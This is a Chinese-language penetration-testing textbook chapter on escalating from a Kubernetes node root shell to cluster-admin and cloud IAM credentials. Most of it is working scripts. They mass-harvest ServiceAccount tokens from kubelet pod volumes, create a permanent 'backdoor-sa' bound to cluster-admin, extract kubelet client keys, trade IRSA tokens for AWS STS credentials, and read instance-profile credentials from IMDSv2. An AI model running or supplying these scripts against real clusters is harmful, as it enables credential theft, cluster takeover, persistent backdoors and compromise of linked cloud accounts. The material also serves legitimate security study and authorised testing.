# Ch 28 — 節點→cluster-admin：與 Cloud IAM 交會

> **目標**：從 Ch27 逃逸後取得的 node shell，用三條路線（SA token 收割、kubelet 憑證、Cloud IAM 側信道）打到 cluster-admin 或雲端帳號；理解 IRSA/Workload Identity 在攻擊者視角的意義；知道防禦要拉哪幾條線。

---

## 為什麼需要

Ch27 的 Pod 逃逸讓我們拿到了節點（node）上的 root shell，但 node root ≠ cluster-admin。K8s 的授權邊界在 API server，不在 OS 層。我們手上沒有能呼叫 API server 的高權限憑證，`kubectl get secrets -A` 仍會回 403。

從節點衝向 cluster-admin 有三條主線：

1. **SA token 收割**：節點上跑著所有被排程到此節點的 Pod，它們的 ServiceAccount（服務帳號）token 全部以明文儲存在 `/var/lib/kubelet/pods/<uid>/volumes/`。只要有任一 Pod 的 SA 綁了高權限角色，那個 token 就是我們的入場券。

2. **kubelet 憑證**：kubelet 本身用 TLS 客戶端憑證與 API server 溝通，憑證和 kubeconfig 就放在節點的磁碟上。這條路不用靠其他 Pod，但受 Node Authorizer 限制，不等於 cluster-admin。

3. **Cloud IAM 側信道**：在 EKS、GKE、AKS 等受管叢集（managed cluster）上，Pod 可能持有 IRSA token 或 Workload Identity token，這些 token 能換取雲端 IAM 角色憑證。K8s 打穿 → 雲端帳號打穿，影響面瞬間擴大一個數量級。

三條路不互斥，滲透時要同時踩點，取最快的那條。

---

## 先建直覺

```
┌──────────────────────────────────────────────────────────────────┐
│                         攻擊全局圖                                 │
└──────────────────────────────────────────────────────────────────┘

  Ch27 Pod escape
        │
        ▼
  ┌─────────────┐
  │  Node root  │
  └──────┬──────┘
         │
   ┌─────┴──────────────────────────────────────────┐
   │              節點磁碟可讀內容                     │
   └──────┬────────────────────┬────────────────────┘
          │                    │
          ▼                    ▼
  /var/lib/kubelet/      /etc/kubernetes/
  pods/<uid>/volumes/    kubelet.conf
  .../token              (client cert)
          │                    │
          │  收割所有 SA token  │  kubelet 憑證
          ▼                    ▼
  ┌───────────────────────────────────┐
  │          K8s API Server           │
  └───────────┬───────────────────────┘
              │
              ├── 找到 cluster-admin SA token → cluster-admin ✓
              │
              └── kubelet cert → Node Authorizer 限制範圍 (非 cluster-admin)

   ───────────────────────────── Cloud 側信道 ────────────────────────

  /var/lib/kubelet/pods/<uid>/volumes/
  └── kubernetes.io~projected/
      └── (非 kube-api-access 的 volume)  ← IRSA / Workload Identity token
               │
               ▼
      AWS STS AssumeRoleWithWebIdentity
      / GCP OIDC token exchange
               │
               ▼
      Cloud IAM Role 臨時憑證
      (S3/EC2/RDS/GCS/BigQuery ...)

  節點本身 (EC2)
  └── http://169.254.169.254/  ← IMDSv2 metadata endpoint
      └── iam/security-credentials/<role>
               │
               ▼
      Instance Profile 憑證
      (ECR pull、EBS CSI、eks:DescribeCluster ...)
```

攻擊者站在節點上時，SA token 收割是首選：成功率高、不受 Node Authorizer 限制、幾乎在所有叢集都有效。Cloud IAM 路線是加分項，在受管叢集上可能讓影響面從「叢集淪陷」升級到「整個雲端帳號淪陷」。

---

## 底層機制

### 節點的 kubelet Pod 目錄結構

kubelet 把每個 Pod 的 volume 掛到固定路徑：

```
/var/lib/kubelet/pods/
└── <pod-uid>/
    ├── volumes/
    │   ├── kubernetes.io~projected/
    │   │   └── kube-api-access-<hash>/
    │   │       ├── token          ← SA token（JWT）
    │   │       ├── ca.crt
    │   │       └── namespace
    │   ├── kubernetes.io~secret/
    │   │   └── <secret-name>/
    │   │       └── ...
    │   └── kubernetes.io~configmap/
    │       └── ...
    ├── etc-hosts
    └── plugins/
```

`kube-api-access-*` 是 K8s 1.21+ 的 projected volume，裡面的 token 是 **BoundServiceAccountToken**，有 audience 限制（`aud: ["https://kubernetes.default.svc"]`）和過期時間（預設 3600 秒，kubelet 會在到期前自動輪換）。

在節點上我們有 root 讀取權，可以直接讀取所有 Pod 的 token，不需要對 API server 發任何請求。

### BoundServiceAccountToken 的 JWT 結構

```json
{
  "aud": ["https://kubernetes.default.svc"],
  "exp": 1754000000,
  "iat": 1753996400,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "kubernetes.io": {
    "namespace": "kube-system",
    "pod": { "name": "coredns-5d78c9869d-abc12", "uid": "..." },
    "serviceaccount": { "name": "coredns", "uid": "..." }
  },
  "sub": "system:serviceaccount:kube-system:coredns"
}
```

sub 欄位直接告訴我們這個 token 屬於哪個 SA，過濾高權限目標時用 `jwt decode` 或 `base64 -d` 拆開第二段即可。

### kubelet 憑證路徑

kubelet 用兩種憑證與 API server 溝通：

- `/etc/kubernetes/kubelet.conf`：包含 client certificate 和 client key（通常是 PEM 格式 inline base64），CN 是 `system:node:<node-name>`，Group 是 `system:nodes`。
- `/var/lib/kubelet/pki/kubelet-client-current.pem`：實際的 TLS 客戶端憑證和私鑰。

`system:node:<name>` 綁定的角色受 **Node Authorizer**（節點授權者）管控，只允許 kubelet 讀取排程在自身節點的 Pod 所需的 Secret、ConfigMap；無法讀取其他節點的資源，也無法建立 ClusterRoleBinding。所以 kubelet 憑證能確認 API server 位址、驗證 TLS，但拿到的權限是 node-scoped，不是 cluster-admin。

### IRSA (IAM Roles for Service Accounts) 的運作方式

**本段包含 EKS 受管叢集特定行為，部分細節未在本地環境實測，為基於 AWS 官方文件的理論預期行為。**

EKS 的 IRSA 機制讓 Pod 能承擔（assume）AWS IAM role 而不需要長期的存取金鑰。Pod spec 上加了 annotation `eks.amazonaws.com/role-arn: arn:aws:iam::ACCOUNT:role/ROLE`，EKS Pod Identity Webhook 會自動注入：

- 環境變數 `AWS_ROLE_ARN`、`AWS_WEB_IDENTITY_TOKEN_FILE`
- projected volume：掛載一個 audience 為 `sts.amazonaws.com` 的 token（不是給 K8s API server 用的）

這個 IRSA token 的 aud 是 `["sts.amazonaws.com"]`，跟 kube-api-access token 的 aud 完全不同。兩者雖然都在 `/var/lib/kubelet/pods/<uid>/volumes/` 裡，但用途截然不同，不能混用。

Volume 目錄名稱通常是 `aws-iam-token` 或 `eks.amazonaws.com`，與 `kube-api-access-*` 平行存在：

```
/var/lib/kubelet/pods/<pod-uid>/volumes/
├── kubernetes.io~projected/
│   ├── kube-api-access-xxxxx/   ← K8s API token
│   │   └── token
│   └── aws-iam-token/           ← IRSA token (aud=sts.amazonaws.com)
│       └── token
```

---

## 範例一：節點上的 SA token 大規模收割

在節點 root shell 裡，列出所有 Pod 的 token 並顯示對應的 SA：

```bash
#!/bin/bash
# 收割節點上所有 Pod 的 SA token
APISERVER=""

# 嘗試從多個位置取得 API server 位址
if [ -f /etc/kubernetes/kubelet.conf ]; then
    APISERVER=$(grep -oP '(?<=server: )https://[^\s]+' /etc/kubernetes/kubelet.conf | head -1)
fi

if [ -z "$APISERVER" ] && [ -f /var/lib/kubelet/config.yaml ]; then
    # 有些設定會在 clusterDNS 附近暗示 cluster IP range
    APISERVER="https://$(hostname -I | awk '{print $1}' | sed 's/\.[0-9]*$/\.1/')"
fi

echo "[*] Target API server: $APISERVER"
echo ""

for pod_dir in /var/lib/kubelet/pods/*/; do
    pod_uid=$(basename "$pod_dir")
    # 找 kube-api-access token（給 K8s API 用的）
    token_file=$(find "$pod_dir/volumes" -path "*/kube-api-access-*/token" 2>/dev/null | head -1)

    if [ -z "$token_file" ]; then
        continue
    fi

    token=$(cat "$token_file")
    # 拆開 JWT 第二段，解碼取得 SA 資訊
    payload=$(echo "$token" | cut -d'.' -f2 | tr -- '-_' '+/' | \
              awk '{n=length($0)%4; if(n==2)$0=$0"=="; if(n==3)$0=$0"="; print}' | \
              base64 -d 2>/dev/null)

    sa_name=$(echo "$payload" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('kubernetes.io',{}).get('serviceaccount',{}).get('name','unknown'))" 2>/dev/null)
    namespace=$(echo "$payload" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('kubernetes.io',{}).get('namespace','unknown'))" 2>/dev/null)
    exp=$(echo "$payload" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('exp',0))" 2>/dev/null)
    now=$(date +%s)

    echo "=== Pod UID: $pod_uid ==="
    echo "    SA: $namespace/$sa_name"
    echo "    Token 過期: $exp (now=$now, 剩餘 $((exp - now)) 秒)"
    echo "    Token 路徑: $token_file"

    # 測試 token 能否呼叫 API server
    if [ -n "$APISERVER" ]; then
        resp=$(curl -sk -o /dev/null -w "%{http_code}" \
               -H "Authorization: Bearer $token" \
               "$APISERVER/api/v1/namespaces/kube-system/secrets")
        echo "    API 測試 (GET kube-system/secrets): HTTP $resp"
        if [ "$resp" = "200" ]; then
            echo "    *** 高權限 token 找到！ ***"
        fi
    fi
    echo ""
done
```

輸出範例（簡化）：

```
[*] Target API server: https://10.0.0.1:6443

=== Pod UID: a1b2c3d4-... ===
    SA: kube-system/coredns
    Token 過期: 1754003600 (now=1754000000, 剩餘 3600 秒)
    Token 路徑: /var/lib/kubelet/pods/a1b2c3d4-.../volumes/.../token
    API 測試 (GET kube-system/secrets): HTTP 403

=== Pod UID: f7e8d9c0-... ===
    SA: monitoring/prometheus-k8s
    Token 過期: 1754003700 (now=1754000000, 剩餘 3700 秒)
    Token 路徑: /var/lib/kubelet/pods/f7e8d9c0-.../volumes/.../token
    API 測試 (GET kube-system/secrets): HTTP 200
    *** 高權限 token 找到！ ***
```

找到高權限 token 後，建立 ClusterRoleBinding 把自己提升到 cluster-admin：

```bash
TOKEN="<高權限-token>"
APISERVER="https://10.0.0.1:6443"

# 確認目前身份
curl -sk -H "Authorization: Bearer $TOKEN" \
     "$APISERVER/api/v1/namespaces/kube-system/secrets" | python3 -m json.tool | head -20
```

---

## 範例二：用收割的 token 建立 cluster-admin ClusterRoleBinding

確認 token 有 `clusterrolebindings` 的建立權限後，用 curl 直接打 API server：

```bash
TOKEN="<高權限-token>"
APISERVER="https://10.0.0.1:6443"

# 建立一個 SA 讓我們長期使用
curl -sk -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     "$APISERVER/api/v1/namespaces/kube-system/serviceaccounts" \
     -d '{
       "apiVersion": "v1",
       "kind": "ServiceAccount",
       "metadata": {"name": "backdoor-sa", "namespace": "kube-system"}
     }'

# 綁定 cluster-admin
curl -sk -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" \
     -d '{
       "apiVersion": "rbac.authorization.k8s.io/v1",
       "kind": "ClusterRoleBinding",
       "metadata": {"name": "backdoor-crb"},
       "roleRef": {
         "apiGroup": "rbac.authorization.k8s.io",
         "kind": "ClusterRole",
         "name": "cluster-admin"
       },
       "subjects": [{
         "kind": "ServiceAccount",
         "name": "backdoor-sa",
         "namespace": "kube-system"
       }]
     }'

# 取得 backdoor-sa 的 token（K8s 1.24+ 需要手動建立 Secret）
curl -sk -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     "$APISERVER/api/v1/namespaces/kube-system/secrets" \
     -d '{
       "apiVersion": "v1",
       "kind": "Secret",
       "metadata": {
         "name": "backdoor-sa-token",
         "namespace": "kube-system",
         "annotations": {"kubernetes.io/service-account.name": "backdoor-sa"}
       },
       "type": "kubernetes.io/service-account-token"
     }'

# 讀取產生的 token（等幾秒讓 token controller 填入）
sleep 3
BACKDOOR_TOKEN=$(curl -sk \
     -H "Authorization: Bearer $TOKEN" \
     "$APISERVER/api/v1/namespaces/kube-system/secrets/backdoor-sa-token" | \
     python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']['token']).decode())")

echo "Backdoor token: $BACKDOOR_TOKEN"

# 驗證：用 backdoor token 列出所有 namespace
curl -sk -H "Authorization: Bearer $BACKDOOR_TOKEN" \
     "$APISERVER/api/v1/namespaces" | python3 -c \
     "import sys,json; d=json.load(sys.stdin); [print(ns['metadata']['name']) for ns in d['items']]"
```

這個 backdoor SA token 是永久有效的（非 BoundServiceAccountToken），不會在 1 小時後過期，除非 Secret 或 SA 被刪除。這是攻擊者偏好建立的持久化憑證，Ch29 會繼續延伸。

---

## 範例三（邊界案例）：Projected Token 過期與 kubelet.conf 的退路

**情境**：收割到的 token 是 BoundServiceAccountToken，1 小時後就失效，而 API server 距離我們的動作還需要時間。

```bash
# 測試 token 是否已過期
TOKEN=$(cat /var/lib/kubelet/pods/<uid>/volumes/.../token)
APISERVER="https://10.0.0.1:6443"

resp=$(curl -sk -w "\n%{http_code}" \
       -H "Authorization: Bearer $TOKEN" \
       "$APISERVER/api/v1/namespaces")
http_code=$(echo "$resp" | tail -1)
body=$(echo "$resp" | head -1)

if [ "$http_code" = "401" ]; then
    echo "[!] Token 已過期或無效"
    echo "$body" | python3 -m json.tool
    # 輸出: {"reason": "Unauthorized", "message": "...token has expired..."}
fi

# 退路：用 kubelet 的客戶端憑證直接呼叫 API server
# kubelet.conf 裡面的 certificate-data 和 key-data 是 base64 encoded PEM
KUBELET_CONF="/etc/kubernetes/kubelet.conf"

# 提取 client cert 和 key
python3 << 'EOF'
import yaml, base64, os

with open('/etc/kubernetes/kubelet.conf') as f:
    conf = yaml.safe_load(f)

user = conf['users'][0]['user']
cluster = conf['clusters'][0]['cluster']

# 寫出 cert 和 key
with open('/tmp/kubelet-client.crt', 'wb') as f:
    f.write(base64.b64decode(user['client-certificate-data']))
with open('/tmp/kubelet-client.key', 'wb') as f:
    f.write(base64.b64decode(user['client-key-data']))
with open('/tmp/kubelet-ca.crt', 'wb') as f:
    f.write(base64.b64decode(cluster['certificate-authority-data']))

print(f"API Server: {cluster['server']}")
EOF

# 用 kubelet 憑證呼叫 API server（注意：這是 system:node 權限，非 cluster-admin）
curl -s \
     --cert /tmp/kubelet-client.crt \
     --key /tmp/kubelet-client.key \
     --cacert /tmp/kubelet-ca.crt \
     "https://10.0.0.1:6443/api/v1/nodes/$(hostname)" | \
     python3 -c "import sys,json; d=json.load(sys.stdin); print(d['metadata']['name'])"

# 確認身份（應該看到 system:node:<nodename>）
curl -s \
     --cert /tmp/kubelet-client.crt \
     --key /tmp/kubelet-client.key \
     --cacert /tmp/kubelet-ca.crt \
     "https://10.0.0.1:6443/api/v1/namespaces/kube-system/secrets"
# 預期 HTTP 403：Node Authorizer 阻擋，system:node 不能讀 kube-system secrets
```

kubelet 憑證的限制：
- 可以讀取自身節點的 Node 資源
- 可以讀取排程在本節點的 Pod 所需的 Secret（但 Node Authorizer 會在 API server 端過濾）
- **無法**建立 ClusterRoleBinding、讀取 kube-system secrets、列出所有 namespace

所以 kubelet.conf 的最大用途是確認 API server 位址和 CA 憑證，不是當作高權限憑證使用。真正的 cluster-admin 路線還是要靠 SA token 收割。

---

## 範例四（EKS/Cloud）：IRSA token 換取 AWS 憑證

**本段為 EKS 受管叢集行為，未在實際環境中全流程驗證，為基於 AWS 文件的理論預期行為。可用 EKS Free Tier 或 LocalStack 部分驗證。**

在節點上找 IRSA token：

```bash
# 找所有非 kube-api-access 的 projected volume token
for pod_dir in /var/lib/kubelet/pods/*/; do
    # 找 aws-iam-token（IRSA）或其他非 kube-api-access 的 token
    irsa_tokens=$(find "$pod_dir/volumes/kubernetes.io~projected" \
                       -name "token" 2>/dev/null | \
                  grep -v "kube-api-access")

    if [ -n "$irsa_tokens" ]; then
        echo "=== Pod: $(basename $pod_dir) ==="
        for tok_path in $irsa_tokens; do
            echo "  Token 路徑: $tok_path"
            # 解碼 JWT 看 aud（audience）
            payload=$(cat "$tok_path" | cut -d'.' -f2 | tr -- '-_' '+/' | \
                      awk '{n=length($0)%4; if(n==2)$0=$0"=="; if(n==3)$0=$0"="; print}' | \
                      base64 -d 2>/dev/null)
            echo "  Audience: $(echo "$payload" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('aud','N/A'))" 2>/dev/null)"

            # 也找環境變數（在 /proc/<pid>/environ 裡找 AWS_ROLE_ARN）
        done

        # 找 Pod 的環境變數（從 /proc 讀）
        # 需要先找到這個 pod uid 對應的 PID
    fi
done

# 找到 IRSA token 後，換取 AWS 臨時憑證
IRSA_TOKEN_PATH="/var/lib/kubelet/pods/<uid>/volumes/kubernetes.io~projected/aws-iam-token/token"
AWS_ROLE_ARN="arn:aws:iam::123456789012:role/target-high-priv-role"

# 呼叫 STS（需要節點有對外網路或 AWS PrivateLink）
curl -s -X POST "https://sts.amazonaws.com/" \
     -d "Action=AssumeRoleWithWebIdentity" \
     -d "Version=2011-06-15" \
     -d "RoleArn=$AWS_ROLE_ARN" \
     -d "RoleSessionName=attacker-session" \
     -d "WebIdentityToken=$(cat $IRSA_TOKEN_PATH)" | \
     python3 -c "
import sys, xml.etree.ElementTree as ET
tree = ET.parse(sys.stdin)
ns = {'sts': 'https://sts.amazonaws.com/doc/2011-06-15/'}
creds = tree.find('.//sts:Credentials', ns)
if creds:
    print('AccessKeyId:', creds.find('sts:AccessKeyId', ns).text)
    print('SecretAccessKey:', creds.find('sts:SecretAccessKey', ns).text)
    print('SessionToken:', creds.find('sts:SessionToken', ns).text[:30] + '...')
    print('Expiration:', creds.find('sts:Expiration', ns).text)
"

# 節點本身的 Instance Profile（IMDSv2）
# Step 1: 取得 IMDSv2 session token（TTL=21600 = 6小時）
IMDS_TOKEN=$(curl -s -X PUT \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
     "http://169.254.169.254/latest/api/token")

# Step 2: 用 session token 查詢 IAM role 名稱
ROLE_NAME=$(curl -s \
     -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/")

echo "Node IAM Role: $ROLE_NAME"

# Step 3: 取得完整 IAM 憑證
curl -s \
     -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
# 輸出包含 AccessKeyId, SecretAccessKey, Token, Expiration
```

---

## 對比取捨表

| 攻擊路線 | 取得的存取權 | 持久性 | 偵測風險 | 雲端影響 |
|---------|------------|--------|---------|---------|
| 收割 SA token（高權限） | cluster-admin（視 SA 綁定） | token 1hr 過期，需重讀節點 | 中：audit log 會記錄 token 使用 | 無（純 K8s 層） |
| kubelet client cert | system:node（Node Authorizer 限制） | 憑證通常 1 年有效 | 低：與正常 kubelet 流量難區分 | 無 |
| 收割 IRSA token | 對應 AWS IAM role 的 AWS 權限 | token 1hr 過期，但 AWS creds 1hr | 中：CloudTrail 記錄 AssumeRoleWithWebIdentity | 高：直通 AWS 帳號 |
| Node Instance Profile | 節點 IAM role 的 AWS 權限 | 動態輪換，攻擊者持續可取得 | 低：IMDSv2 正常請求難偵測 | 中：通常是低權限 node role |

---

## 踩雷集錦

**1. Projected Token 1 小時過期，手動收割的 token 很快失效**

BoundServiceAccountToken 的 `exp` 欄位是 iat+3600（秒），kubelet 會在到期前 80% 時間（約 48 分鐘後）輪換。手動 `cat` 到的 token 不會自動更新。

解法：把收割腳本寫成 loop，在 token 過期前重讀檔案；或者建立一個長效 Secret-based token（範例二的做法）。

**2. kubelet 憑證 ≠ cluster-admin**

很多人看到 kubelet.conf 有 client cert 就以為拿到了完整的叢集控制。Node Authorizer 在 API server 端嚴格限制 `system:node:*` 能做的事，無法讀取其他節點的 Secret，無法建立 ClusterRoleBinding。kubelet cert 的真實用途是確認 API server 位址，不是提權工具。

**3. IRSA token 的 audience 是 `sts.amazonaws.com`，不能拿來認證 K8s API**

IRSA 的 projected token 和 kube-api-access 的 token 都是 JWT，但 aud 不同。拿 IRSA token 去打 K8s API server 會得到 `401 Unauthorized`，API server 會拒絕 audience 不符的 token。反過來也不行：kube-api-access token 拿去打 STS 也會失敗。收割時必須區分兩種 token 的路徑和用途。

**4. EKS 節點預設啟用 IMDSv2，舊方法 `curl 169.254.169.254` 直接失效**

IMDSv1 的一步查詢已被 IMDSv2 的兩步查詢取代（先 PUT 取 session token，再 GET 資料）。在啟用了 `HttpTokens=required` 的 EKS 節點上，不帶 `X-aws-ec2-metadata-token` header 的請求會得到 `401` 回應。腳本必須先 `PUT /latest/api/token` 取得 session token 才能繼續。

**5. aws-auth ConfigMap 的修改路線留到 Ch30**

拿到 cluster-admin 後，修改 `kube-system/aws-auth` ConfigMap 可以把 AWS IAM user 或 role 映射到 K8s RBAC，是 EKS 特有的橫向移動路徑。這個方向屬於受管叢集差異（managed cluster differences）的範疇，在 Ch30 詳細展開，本章不深入。

---

## 進階延伸

**GKE Workload Identity** 的機制與 IRSA 相似，但 token 換取的是 Google 服務帳號（Google Service Account）的 OAuth 2.0 access token。節點上的路徑是 `/var/run/secrets/tokens/` 或在 projected volume 中。GKE 節點本身也有 metadata server（`http://metadata.google.internal/`），提供 instance service account 憑證。

**AKS Pod Identity / Workload Identity** 使用 Azure AD 聯合憑證（federated credentials），token 換取 Azure AD access token，能存取 Azure Resource Manager API。攻擊路徑相同：讀節點的 projected volume token，換 Azure AD token，呼叫 ARM API。

**Token Projection 的 audience 客製化**：K8s 允許 Pod spec 裡指定 projected token 的 audience 和 expirationSeconds。稽核時要特別注意 audience 不是 `kubernetes.default.svc` 的 projected token，那些很可能是 Cloud IAM 聯動用的。

**Node Authorizer 繞過**：Node Authorizer 的白名單規則基於 Pod 到 Node 的排程關係，如果攻擊者能操控排程（例如有 pods/create 權限），理論上可以讓特定 Secret 被授權給自己的 Pod。這是 RBAC 縱深防禦的另一個面向。

---

## 本章重點整理

- 節點 root 後，`/var/lib/kubelet/pods/` 是 token 礦坑：所有 Pod 的 SA token 以明文儲存，mass harvest 是首要動作。
- BoundServiceAccountToken 有 1 小時 TTL，攻擊時要計時，或立即建立永久 Secret-based token 持久化。
- kubelet client cert（kubelet.conf）受 Node Authorizer 限制，不等於 cluster-admin；用途是確認 API server 位址和 CA，不是提權工具。
- IRSA / Workload Identity token 的 audience 是 Cloud STS（`sts.amazonaws.com`），不能打 K8s API；反之亦然。K8s 打穿可能直接兌換成雲端帳號控制權。
- EKS 節點的 IMDSv2 需要兩步驟（PUT session token → GET 資料），舊的一步 curl 會回 401。
- Instance Profile 給的是節點 IAM role 的權限，通常是較低的 node role（ECR pull、EBS 操作），但可能有 `eks:DescribeCluster` 等能進一步偵察的權限。

---

## 自我檢核

1. 在節點上，哪個目錄結構包含所有 Pod 的 SA token？token 的最長有效期預設是多少秒？
2. `system:node:<name>` 身份透過 kubelet.conf 能對 API server 做哪些操作？為什麼不能列出 `kube-system` 的 Secrets？
3. IRSA token 和 kube-api-access token 都在 projected volume 裡，如何在節點上快速區分哪個是 IRSA token？
4. 在啟用 IMDSv2（`HttpTokens=required`）的 EKS 節點上，取得 Instance Profile 憑證需要哪兩個步驟？第一步的 HTTP method 是什麼？
5. 收割到一個高權限 SA token 之後，為什麼要立刻建立一個 Secret-based 的 ServiceAccount token，而不是繼續用收割來的 token？

---

## 延伸閱讀

1. **AWS EKS IRSA 官方文件**：[IAM roles for service accounts](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html) — 了解 IRSA 的 OIDC federation 機制，攻擊者視角必讀。
2. **Kubernetes Node Authorization**：[Node Authorizer](https://kubernetes.io/docs/reference/access-authn-authz/node/) — Node Authorizer 的白名單規則，解釋為什麼 kubelet cert 不等於 cluster-admin。
3. **BoundServiceAccountToken 設計**：[Kubernetes KEP-1205](https://github.com/kubernetes/enhancements/tree/master/keps/sig-auth/1205-bound-service-account-tokens) — projected token 的 audience 和過期設計。
4. **Bishop Fox: Attacking EKS**：[Hacking the Cloud: EKS](https://bishopfox.com/blog/kubernetes-and-eks-attack-surface) — 實戰 EKS 攻擊面，包含 IRSA 和 Instance Profile 利用。
5. **MITRE ATT&CK for Containers**：[T1552.007 Container API](https://attack.mitre.org/techniques/T1552/007/) — SA token 收割在 ATT&CK 框架中的分類與對應偵測建議。

---

Ch28 把從節點打到 cluster-admin、以及 K8s 與 Cloud IAM 的交叉口講清楚了。下一章 Ch29 接著討論拿到 cluster-admin 後如何建立**持久化（persistence）**，包含後門 SA、mutating webhook 注入、以及 etcd 直接操作。
